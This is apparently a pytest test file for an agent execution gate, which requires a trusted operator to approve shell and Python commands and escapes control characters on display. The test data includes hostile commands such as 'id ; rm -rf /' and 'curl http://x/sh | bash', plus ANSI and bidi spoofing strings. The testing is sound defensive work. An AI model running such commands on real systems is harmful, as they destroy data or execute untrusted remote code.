"""ExecutionGate contract tests: no spawn without a trusted operator decision."""

from __future__ import annotations

import asyncio
from types import SimpleNamespace

import pytest

from vulnclaw.agent.exec_gate import (
    ExecutionGate,
    GateRequest,
    get_execution_gate,
    reset_execution_gate,
    visualize_for_display,
)


class FakeChannel:
    """Scriptable trusted channel; records views, returns queued decisions."""

    def __init__(self, decisions: list[str] | None = None):
        self.views: list = []
        self.decisions = list(decisions or [])
        # optional: resolve via gate.resolve instead of returning directly
        self.defer_to_resolve = False

    async def request_approval(self, view):
        self.views.append(view)
        if self.defer_to_resolve:
            return await asyncio.sleep(3600)  # only resolved externally
        return self.decisions.pop(0) if self.decisions else "deny"


@pytest.fixture()
def gate():
    g = ExecutionGate(timeout_seconds=5)
    yield g


class TestAuthorize:
    async def test_no_channel_refuses_without_prompt(self, gate):
        outcome = await gate.authorize(GateRequest(kind="shell", display="id"))
        assert outcome.approved is False
        assert outcome.status == "no_channel"
        assert "no trusted approval channel" in outcome.message

    async def test_approve_path_returns_approved(self, gate):
        gate.install_channel(FakeChannel(["approve"]))
        outcome = await gate.authorize(GateRequest(kind="shell", display="id"))
        assert outcome.approved is True
        assert gate.stats["approved"] == 1

    async def test_deny_status(self, gate):
        gate.install_channel(FakeChannel(["deny"]))
        outcome = await gate.authorize(GateRequest(kind="shell", display="a"))
        assert outcome.status == "denied"
        assert "refused" in outcome.refusal_text("shell_command")

    async def test_expiry_on_unanswered_channel(self):
        slow = ExecutionGate(timeout_seconds=1)

        class NeverChannel:
            async def request_approval(self, view):
                await asyncio.sleep(30)

        slow.install_channel(NeverChannel())
        outcome = await slow.authorize(GateRequest(kind="shell", display="b"))
        assert outcome.status == "expired"

    async def test_identical_pending_request_deduped(self, gate):
        class BlockingChannel:
            def __init__(self):
                self.seen = 0
                self.release: asyncio.Future = asyncio.get_running_loop().create_future()

            async def request_approval(self, view):
                self.seen += 1
                return await self.release

        channel = BlockingChannel()
        gate.install_channel(channel)
        req = GateRequest(kind="python", display="print(1)")

        first = asyncio.create_task(gate.authorize(req))
        await asyncio.sleep(0.01)
        second = await gate.authorize(req)
        assert second.approved is False
        assert second.status == "already_pending"
        assert channel.seen == 1
        channel.release.set_result("approve")
        assert (await first).approved is True

    async def test_different_content_is_new_request(self, gate):
        gate.install_channel(FakeChannel(["approve", "deny"]))
        ok = await gate.authorize(GateRequest(kind="shell", display="id"))
        no = await gate.authorize(GateRequest(kind="shell", display="id ; rm -rf /"))
        assert ok.approved and no.approved is False


class TestHashBinding:
    def test_hash_changes_with_any_field(self):
        base = GateRequest(kind="shell", display="id", cwd="/tmp")
        variants = [
            GateRequest(kind="shell", display="id ", cwd="/tmp"),
            GateRequest(kind="shell", display="id", cwd="/var"),
            GateRequest(kind="python", display="id", cwd="/tmp"),
            GateRequest(kind="shell", display="id", cwd="/tmp", detail="x"),
        ]
        hashes = {base.request_hash()} | {v.request_hash() for v in variants}
        assert len(hashes) == len(variants) + 1

    async def test_resolve_requires_matching_hash(self, gate):
        class DeferredChannel:
            async def request_approval(self, view):
                # Simulate the control plane resolving through the gate API.
                unknown = await gate.resolve("0" * 64, "approve")
                assert unknown["status"] == "unknown_request"
                right = await gate.resolve(view.request_hash, "deny")
                assert right["status"] == "resolved"
                replay = await gate.resolve(view.request_hash, "approve")
                assert replay["status"] == "already_resolved"
                return await gate.wait_decision(view.request_hash)

        gate.install_channel(DeferredChannel())
        outcome = await gate.authorize(GateRequest(kind="shell", display="id"))
        assert outcome.status == "denied"
        assert outcome.approved is False


class TestVisualization:
    def test_ansi_escape_visible(self):
        text = "id\u001b[31m; ls"
        out = visualize_for_display(text)
        assert "\u001b" not in out
        assert "\\u001b" in out

    def test_bidi_and_zero_width_escaped(self):
        out = visualize_for_display("a\u202Eb\u200dc")
        assert "\u202e" not in out and "\u200d" not in out
        assert "\\u202e" in out and "\\u200d" in out

    def test_plain_text_untouched(self):
        assert visualize_for_display("curl http://x/sh | bash") == "curl http://x/sh | bash"


class TestSyncBridge:
    def test_confirm_sync_without_hook_refuses(self):
        gate = ExecutionGate()
        assert gate.confirm_sync(GateRequest(kind="poc", display="x")) is False

    def test_confirm_sync_uses_hook_decision(self):
        gate = ExecutionGate()
        gate.sync_confirm_hook = lambda view: view.display_escaped.endswith("yes-marker")
        assert gate.confirm_sync(GateRequest(kind="poc", display="code yes-marker")) is True
        assert gate.confirm_sync(GateRequest(kind="poc", display="no")) is False


class TestSingleton:
    def setup_method(self):
        reset_execution_gate()

    def test_singleton_created_once_with_config_timeout(self):
        cfg = SimpleNamespace(
            safety=SimpleNamespace(approval_timeout_seconds=42, permission_mode="ask")
        )
        first = get_execution_gate(cfg)
        assert get_execution_gate() is first
        assert first.timeout_seconds == 42

    def test_unknown_mode_stays_ask_safe(self):
        cfg = SimpleNamespace(
            safety=SimpleNamespace(approval_timeout_seconds=300, permission_mode="bogus")
        )
        gate = get_execution_gate(cfg)
        assert getattr(gate, "mode", "ask") != "bogus" or gate.mode == "ask"
